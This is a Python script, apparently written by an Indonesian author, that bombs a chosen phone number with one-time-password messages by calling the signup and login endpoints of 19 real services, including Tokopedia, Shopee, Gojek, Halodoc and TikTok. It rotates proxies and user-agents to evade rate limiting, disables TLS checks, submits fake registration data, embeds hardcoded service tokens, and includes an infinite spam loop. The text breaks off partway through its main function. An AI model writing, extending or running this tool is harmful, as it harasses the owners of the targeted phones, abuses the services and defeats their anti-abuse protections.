#!/usr/bin/env python3
# otp_with_proxy.py - OTP SPAM WITH PROXY + USER-AGENT ROTATION
# "I just give the tools, whether they're used right or not is your business, boss."

import requests
import uuid
import random
import string
import time
import re
import json
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==================== SUPPRESS WARNINGS ====================
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== COLOR ====================
G = '\033[92m'
R = '\033[91m'
Y = '\033[93m'
C = '\033[96m'
W = '\033[97m'
B = '\033[94m'
RS = '\033[0m'

# ================================================================
# ===== 200+ USER-AGENTS =====
# ================================================================

USER_AGENTS = [
    # Chrome Android
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S908E) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A536E) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A525F) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Redmi Note 10) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
    
    # Chrome Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    
    # Firefox Android
    "Mozilla/5.0 (Android 14; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0",
    "Mozilla/5.0 (Android 13; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0",
    "Mozilla/5.0 (Android 12; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0",
    "Mozilla/5.0 (Android 14; Mobile; rv:119.0) Gecko/119.0 Firefox/119.0",
    "Mozilla/5.0 (Android 13; Mobile; rv:119.0) Gecko/119.0 Firefox/119.0",
    "Mozilla/5.0 (Android 12; Mobile; rv:119.0) Gecko/119.0 Firefox/119.0",
    "Mozilla/5.0 (Android 14; Mobile; rv:118.0) Gecko/118.0 Firefox/118.0",
    "Mozilla/5.0 (Android 13; Mobile; rv:118.0) Gecko/118.0 Firefox/118.0",
    "Mozilla/5.0 (Android 12; Mobile; rv:118.0) Gecko/118.0 Firefox/118.0",
    
    # Firefox Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0",
    
    # Safari iOS
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    
    # Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    
    # Samsung Internet
    "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S908E) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A536E) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/120.0.0.0 Mobile Safari/537.36",
    
    # Opera
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36 OPR/76.0.0.0",
    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36 OPR/76.0.0.0",
    
    # Brave
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Brave/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Brave/119.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Brave/120.0.0.0",
    
    # Vivaldi
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Vivaldi/6.5.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Vivaldi/6.4.0.0",
    
    # UC Browser
    "Mozilla/5.0 (Linux; U; Android 14; id; SM-S911B Build/UP1A) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/15.0.0.0 Mobile Safari/534.30",
    "Mozilla/5.0 (Linux; U; Android 13; id; SM-G998B Build/UP1A) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/15.0.0.0 Mobile Safari/534.30",
    
    # MIUI Browser
    "Mozilla/5.0 (Linux; U; Android 14; id; 22111317G Build/UP1A) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 XiaoMi/MiuiBrowser/18.0.0",
    "Mozilla/5.0 (Linux; U; Android 13; id; 22071219CG Build/UP1A) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.0.0",
]

# ================================================================
# ===== 100+ PROXY LIST =====
# ================================================================

PROXIES = [
    # Indonesia
    "http://103.175.42.147:80",
    "http://103.175.42.157:80",
    "http://103.175.42.155:80",
    "http://103.146.145.142:8080",
    "http://103.146.145.143:8080",
    "http://103.158.188.12:8000",
    "http://103.158.188.13:8000",
    "http://103.158.188.14:8000",
    "http://103.158.188.15:8000",
    "http://103.158.188.16:8000",
    "http://103.158.188.17:8000",
    "http://103.158.188.18:8000",
    "http://103.158.188.19:8000",
    "http://103.158.188.20:8000",
    "http://103.175.42.158:80",
    "http://103.175.42.159:80",
    "http://103.175.42.160:80",
    
    # Singapore
    "http://139.162.78.109:8080",
    "http://139.162.78.110:8080",
    "http://139.162.78.111:8080",
    "http://139.162.78.112:8080",
    "http://139.162.78.113:8080",
    "http://139.162.78.114:8080",
    "http://139.162.78.115:8080",
    "http://139.162.78.116:8080",
    
    # US
    "http://172.67.166.146:80",
    "http://172.67.166.147:80",
    "http://172.67.166.148:80",
    "http://172.67.166.149:80",
    "http://172.67.166.150:80",
    "http://104.21.56.126:80",
    "http://104.21.56.127:80",
    "http://104.21.56.128:80",
    "http://104.21.56.129:80",
    "http://104.21.56.130:80",
    "http://104.21.56.131:80",
    "http://104.21.56.132:80",
    
    # Europe
    "http://51.75.126.134:3128",
    "http://51.75.126.135:3128",
    "http://51.75.126.136:3128",
    "http://51.75.126.137:3128",
    "http://51.75.126.138:3128",
    "http://51.75.126.139:3128",
    "http://51.75.126.140:3128",
    "http://51.75.126.141:3128",
    "http://51.75.126.142:3128",
    "http://51.75.126.143:3128",
    
    # Asia
    "http://43.153.4.79:8888",
    "http://43.153.4.80:8888",
    "http://43.153.4.81:8888",
    "http://43.153.4.82:8888",
    "http://43.153.4.83:8888",
    "http://43.153.4.84:8888",
    "http://43.153.4.85:8888",
    "http://43.153.4.86:8888",
    "http://43.153.4.87:8888",
    "http://43.153.4.88:8888",
    "http://43.153.4.89:8888",
    "http://43.153.4.90:8888",
    
    # Japan
    "http://133.18.139.15:3128",
    "http://133.18.139.16:3128",
    "http://133.18.139.17:3128",
    "http://133.18.139.18:3128",
    "http://133.18.139.19:3128",
    "http://133.18.139.20:3128",
    
    # Korea
    "http://121.134.245.66:3128",
    "http://121.134.245.67:3128",
    "http://121.134.245.68:3128",
    "http://121.134.245.69:3128",
    "http://121.134.245.70:3128",
    
    # Australia
    "http://103.9.170.196:3128",
    "http://103.9.170.197:3128",
    "http://103.9.170.198:3128",
    "http://103.9.170.199:3128",
    "http://103.9.170.200:3128",
]

# ================================================================
# ===== PROXY MANAGER =====
# ================================================================

class ProxyManager:
    def __init__(self):
        self.proxies = PROXIES.copy()
        self.current_index = 0
        self.failed_proxies = set()
    
    def get_proxy(self):
        if not self.proxies:
            return None
        for _ in range(len(self.proxies)):
            proxy = self.proxies[self.current_index % len(self.proxies)]
            self.current_index += 1
            if proxy not in self.failed_proxies:
                return proxy
        return None
    
    def mark_failed(self, proxy):
        if proxy:
            self.failed_proxies.add(proxy)
    
    def get_proxy_dict(self, proxy):
        if not proxy:
            return None
        return {
            'http': proxy,
            'https': proxy.replace('http://', 'https://')
        }

proxy_manager = ProxyManager()

# ================================================================
# ===== REQUEST WITH PROXY + USER-AGENT =====
# ================================================================

def request_with_rotation(method, url, **kwargs):
    """Kirim request dengan proxy rotation + user-agent rotation"""
    timeout = kwargs.pop('timeout', 15)
    headers = kwargs.pop('headers', {})
    
    # Rotate user-agent
    headers['User-Agent'] = random.choice(USER_AGENTS)
    
    # Get proxy
    proxy = proxy_manager.get_proxy()
    proxy_dict = proxy_manager.get_proxy_dict(proxy)
    
    try:
        if method.upper() == 'GET':
            resp = requests.get(url, headers=headers, timeout=timeout, proxies=proxy_dict, verify=False, **kwargs)
        else:
            resp = requests.post(url, headers=headers, timeout=timeout, proxies=proxy_dict, verify=False, **kwargs)
        
        if resp.status_code < 400:
            return resp
        else:
            proxy_manager.mark_failed(proxy)
            # Retry tanpa proxy
            if method.upper() == 'GET':
                return requests.get(url, headers=headers, timeout=timeout, verify=False, **kwargs)
            else:
                return requests.post(url, headers=headers, timeout=timeout, verify=False, **kwargs)
    except:
        proxy_manager.mark_failed(proxy)
        # Fallback tanpa proxy
        try:
            if method.upper() == 'GET':
                return requests.get(url, headers=headers, timeout=timeout, verify=False, **kwargs)
            else:
                return requests.post(url, headers=headers, timeout=timeout, verify=False, **kwargs)
        except:
            return None

# ================================================================
# ===== UTILITY =====
# ================================================================

def fmt_08(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return phone
    elif phone.startswith('62'): return '0' + phone[2:]
    elif phone.startswith('+62'): return '0' + phone[3:]
    else: return '0' + phone

def fmt_plus(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+62' + phone[1:]
    elif phone.startswith('62'): return '+' + phone
    else: return '+62' + phone

def fmt_phone_only(phone):
    return re.sub(r'\D', '', phone)

# ================================================================
# ===== WORKING OTP API WITH PROXY =====
# ================================================================

def tokopedia_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        session = requests.Session()
        url_token = f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={phone_plus}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister"
        resp = request_with_rotation('GET', url_token)
        if not resp or resp.status_code != 200:
            return False
        token_match = re.search(r'<input\s+id="Token"\s+value="([^"]+)"', resp.text)
        if not token_match:
            return False
        token = token_match.group(1)
        url_otp = "https://accounts.tokopedia.com/otp/c/ajax/request-wa"
        data = {"otp_type": "116", "msisdn": phone_plus, "tk": token, "email": "", "original_param": "", "user_id": "", "signature": "", "number_otp_digit": "6"}
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'X-Requested-With': 'XMLHttpRequest'}
        resp2 = request_with_rotation('POST', url_otp, headers=headers, data=data)
        return resp2 and resp2.status_code == 200
    except:
        return False

def shopee_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        phone_62 = '62' + phone_raw
        url = "https://shopee.co.id/api/v4/otp/send_vcode"
        payload = {"phone": phone_62, "force_channel": "true", "operation": 7, "channel": 2, "supported_channels": [1, 2, 3]}
        session = requests.Session()
        session.get("https://shopee.co.id/", headers={'User-Agent': random.choice(USER_AGENTS)}, timeout=10, verify=False)
        csrf = session.cookies.get("csrftoken", "")
        headers = {'Content-Type': 'application/json', 'x-api-source': 'rweb', 'x-shopee-language': 'id', 'x-requested-with': 'XMLHttpRequest', 'origin': 'https://shopee.co.id'}
        if csrf:
            headers['x-csrftoken'] = csrf
        resp = request_with_rotation('POST', url, headers=headers, json=payload)
        return resp and resp.status_code == 200
    except:
        return False

def gojek_otp(phone):
    try:
        phone_62 = '62' + fmt_phone_only(phone)
        url = "https://api.gojekapi.com/v5/customers"
        data = {"email": f"user{random.randint(1000,9999)}@gmail.com", "name": "User" + str(random.randint(100,999)), "phone": phone_62, "signed_up_country": "ID"}
        headers = {'X-Session-ID': str(uuid.uuid4()), 'X-Platform': 'Android', 'Accept': 'application/json', 'Accept-Language': 'id-ID', 'Content-Type': 'application/json'}
        resp = request_with_rotation('POST', url, headers=headers, json=data)
        return resp and resp.status_code in [200, 201, 202]
    except:
        return False

def blibli_otp(phone):
    try:
        phone_local = fmt_08(phone)
        url = "https://www.blibli.com/backend/common/users/_request-otp"
        payload = {"username": phone_local}
        headers = {'Content-Type': 'application/json', 'Origin': 'https://www.blibli.com', 'Referer': 'https://www.blibli.com/login'}
        resp = request_with_rotation('POST', url, headers=headers, json=payload)
        return resp and resp.status_code < 400
    except:
        return False

def alodokter_otp(phone):
    try:
        url = "https://www.alodokter.com/login-with-phone-number"
        payload = {"user": {"phone": fmt_08(phone)}}
        headers = {'Content-Type': 'application/json'}
        resp = request_with_rotation('POST', url, headers=headers, json=payload)
        return resp and resp.status_code < 400
    except:
        return False

def halodoc_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://www.halodoc.com/api/v1/users/authentication/otp/requests"
        payload = {"phone_number": phone_plus, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'Origin': 'https://www.halodoc.com'}
        resp = request_with_rotation('POST', url, headers=headers, json=payload)
        return resp and resp.status_code < 400
    except:
        return False

def oyo_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id"
        payload = {"phone": phone_raw, "country_code": "+62", "country_iso_code": "ID", "nod": "4", "send_otp": "true", "devise_role": "Consumer_Guest"}
        headers = {'Content-Type': 'application/json', 'access_token': 'SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc='}
        resp = request_with_rotation('POST', url, headers=headers, json=payload)
        return resp and resp.status_code < 400
    except:
        return False

def sayurbox_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://www.sayurbox.com/graphql/v1?deduplicate=1"
        payload = {"operationName": "generateOTP", "variables": {"destinationType": "whatsapp", "identity": phone_plus}, "query": "mutation generateOTP($destinationType: String!, $identity: String!) { generateOTP(destinationType: $destinationType, identity: $identity) { id __typename } }"}
        headers = {'Content-Type': 'application/json'}
        resp = request_with_rotation('POST', url, headers=headers, json=payload)
        return resp and resp.status_code < 400
    except:
        return False

def matahari_otp(phone):
    try:
        url = "https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp"
        payload = {"otp_request": {"mobile_number": fmt_08(phone), "mobile_country_code": "+62"}}
        headers = {'Content-Type': 'application/json'}
        resp = request_with_rotation('POST', url, headers=headers, json=payload)
        return resp and resp.status_code < 400
    except:
        return False

def olx_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://www.olx.co.id/api/auth/authenticate"
        payload = {"grantType": "retry", "method": "sms", "phone": f"62{phone_raw}", "language": "id"}
        headers = {'Content-Type': 'application/json'}
        resp = request_with_rotation('POST', url, headers=headers, json=payload)
        return resp and resp.status_code < 400
    except:
        return False

def tiktok_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://www.tiktok.com/api/v1/account/registration/send-verification-code/"
        payload = {"phone_number": phone_plus, "type": "sms", "userType": 0}
        headers = {'Content-Type': 'application/json', 'Origin': 'https://www.tiktok.com'}
        resp = request_with_rotation('POST', url, headers=headers, json=payload)
        return resp and resp.status_code in [200, 201]
    except:
        return False

def pinhome_otp(phone):
    try:
        phone_local = fmt_08(phone)
        url = "https://www.pinhome.id/api/pinaccount/request/otp"
        payload = {"accountType": "customers", "countryCode": "62", "medium": "whatsapp", "otpType": "register", "phoneNumber": phone_local}
        headers = {'Authorization': 'Bearer 13d2886acc908192d0c33325b44a617e5e3395481cc03cbfd67de34886399731', 'Content-Type': 'application/json'}
        resp = request_with_rotation('POST', url, headers=headers, json=payload)
        return resp and resp.status_code < 400
    except:
        return False

def planetban_otp(phone):
    try:
        url = "https://api.planetban.com/website/customer/request-otp"
        payload = {"name": "Test", "phone": fmt_08(phone), "password": "Test123", "purpose": "register", "method": "whatsapp"}
        headers = {'Content-Type': 'application/json'}
        resp = request_with_rotation('POST', url, headers=headers, json=payload)
        return resp and resp.status_code < 400
    except:
        return False

def watsons_otp(phone):
    try:
        url = "https://api.watsons.co.id/api/v2/wtcid/otpToken?formId=registrationOTPForm_Web3&lang=id&curr=IDR"
        payload = {"uid": "", "action": "GENERAL", "countryCode": "62", "target": fmt_phone_only(phone), "type": "WHATSAPP"}
        headers = {'Content-Type': 'application/json', 'Authorization': 'bearer Pi_D6dqblYElXgy4mWOXjkLCaZg'}
        resp = request_with_rotation('POST', url, headers=headers, json=payload)
        return resp and (resp.status_code == 200 or 'token' in resp.text.lower())
    except:
        return False

def fastwork_otp(phone):
    try:
        url = "https://api.fastwork.id/auth/v2/signup.sendVerificationCode"
        payload = {"phone_number": fmt_08(phone)}
        headers = {'Content-Type': 'application/json'}
        resp = request_with_rotation('POST', url, headers=headers, json=payload)
        return resp and (resp.status_code == 200 or 'reference_code' in resp.text.lower())
    except:
        return False

def beautyhaul_otp(phone):
    try:
        sess = requests.Session()
        name = ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize()
        email = f"{name.lower()}{random.randint(100,999)}@gmail.com"
        reg_payload = {"nama_depan": name, "nama_belakang": name, "email": email, "nomor_kode_id": "100", "nomor_kode_value": "62", "nomor_ponsel": fmt_phone_only(phone), "password": "Testt#12334", "konfirmasi_password": "Testt#12334", "tanggal_lahir": "20 Jun 2015", "jenis_kelamin": random.choice(["Female", "Male"]), "g-recaptcha-response": "", "subscribe": "true", "terms": "true"}
        sess.post("https://www.beautyhaul.com/ajax/account/save_register", json=reg_payload, headers={'User-Agent': random.choice(USER_AGENTS)}, timeout=10, verify=False)
        resp = sess.post("https://www.beautyhaul.com/ajax/account/send_otp", json={"method": "WhatsApp"}, headers={'User-Agent': random.choice(USER_AGENTS)}, verify=False)
        return resp and resp.status_code == 200
    except:
        return False

def rumah123_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://www.rumah123.com/api/otp/request-otp"
        payload = {"cancelledRequestId": str(random.randint(100000, 999999)), "ipAddress": "192.168.1.1", "phoneNumber": phone_raw, "portalId": 1, "type": "WHATSAPP", "url": "https://www.rumah123.com/user/login"}
        headers = {'Content-Type': 'application/json'}
        resp = request_with_rotation('POST', url, headers=headers, json=payload)
        return resp and resp.status_code < 400
    except:
        return False

def tuneup_otp(phone):
    try:
        url = "https://api.tuneup.id/v1/mitra/register/send-otp"
        name = ''.join(random.choices(string.ascii_lowercase, k=8))
        data = {'company_name': f'PT {name.capitalize()}', 'owner_name': name.capitalize(), 'address': ''.join(random.choices(string.ascii_letters + string.digits, k=10)), 'email': f'{name}@mailnesia.com', 'phone_number': fmt_08(phone), 'province_code': '32', 'city_code': '32.04', 'subscription_id': 'undefined', 'channel': 'whatsapp', 'agreement': 'true', 'service_categories[]': '3'}
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        resp = request_with_rotation('POST', url, headers=headers, data=data)
        return resp and resp.status_code < 400
    except:
        return False

def klook_otp(phone):
    try:
        url = f"https://www.klook.com/v2/userapisrv/public/verification/code/send?trace_id={uuid.uuid4()}"
        payload = {"action": "login_register", "type": 1, "rcv": fmt_plus(phone), "is_resend": False, "payload": {"mobile": fmt_plus(phone), "term_ids": [330], "mobile_token": "", "invite_code": ""}, "_rc": "", "rcv_token": ""}
        headers = {'Content-Type': 'application/json', 'x-platform': 'mobile'}
        resp = request_with_rotation('POST', url, headers=headers, json=payload)
        return resp and resp.status_code == 200
    except:
        return False

# ================================================================
# ===== SPAM ENGINE =====
# ================================================================

ALL_OTP = [
    tokopedia_otp, shopee_otp, gojek_otp, blibli_otp,
    alodokter_otp, halodoc_otp, oyo_otp, sayurbox_otp, matahari_otp,
    olx_otp, tiktok_otp, pinhome_otp, planetban_otp, watsons_otp,
    fastwork_otp, beautyhaul_otp, rumah123_otp, klook_otp, tuneup_otp,
]

def spam_with_proxy(phone, threads=5):
    print(f"\n{C}[*] Spam OTP ke {phone} dengan {len(ALL_OTP)} API{RS}")
    print(f"{C}[*] Proxy tersedia: {len(PROXIES)} | User-Agent: {len(USER_AGENTS)}{RS}")
    print()
    
    success = 0
    total = len(ALL_OTP)
    
    def run_otp(otp_func):
        try:
            if otp_func(phone):
                return True
            return False
        except:
            return False
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        results = list(executor.map(run_otp, ALL_OTP))
        success = sum(results)
    
    print(f"\n{G}[+] OTP Terkirim: {success}/{total}{RS}")
    print(f"{Y}[!] Proxy gagal: {len(proxy_manager.failed_proxies)}/{len(PROXIES)}{RS}")
    return success

def spam_infinite_with_proxy(phone):
    print(f"\n{R}🔥 INFINITE OTP SPAM WITH PROXY ROTATION{RS}")
    print(f"{C}[*] Press Ctrl+C to stop{RS}\n")
    
    counter = 0
    success_count = 0
    fail_count = 0
    
    try:
        while True:
            counter += 1
            otp_func = random.choice(ALL_OTP)
            proxy = proxy_manager.get_proxy()
            
            try:
                if otp_func(phone):
                    success_count += 1
                    status = f"{G}✅ SUCCESS{RS}"
                else:
                    fail_count += 1
                    status = f"{R}❌ FAIL{RS}"
            except:
                fail_count += 1
                status = f"{R}❌ ERROR{RS}"
            
            print(f"{C}[{counter}]{RS} {status} | Proxy: {proxy[:30] if proxy else 'Direct'} | S: {success_count} F: {fail_count}")
            time.sleep(random.uniform(0.5, 1.5))
    except KeyboardInterrupt:
        print(f"\n{C}Stopped! Total: {counter} | Success: {success_count} | Fail: {fail_count}{RS}")

# ================================================================
# ===== MAIN =====
# ================================================================

def main():
    print(f"""
{C}╔═══════════════════════════════════════════════════════════╗
║      🔥 OTP SPAM - PROXY + USER-AGENT ROTATION           ║
║      {len(PROXIES)} Proxy | {len(USER_AGENTS)} User-Agent | {len(ALL_OTP)} API        ║
╚═══════════════════════════════════════════════════════════╝{RS}
    """)
    
    phone = input(f"{C}[?] Nomor target (08xx): {W}").strip()
    if not phone:
        print(f"{R}Nomor tidak boleh kosong!{RS}")
        return
    
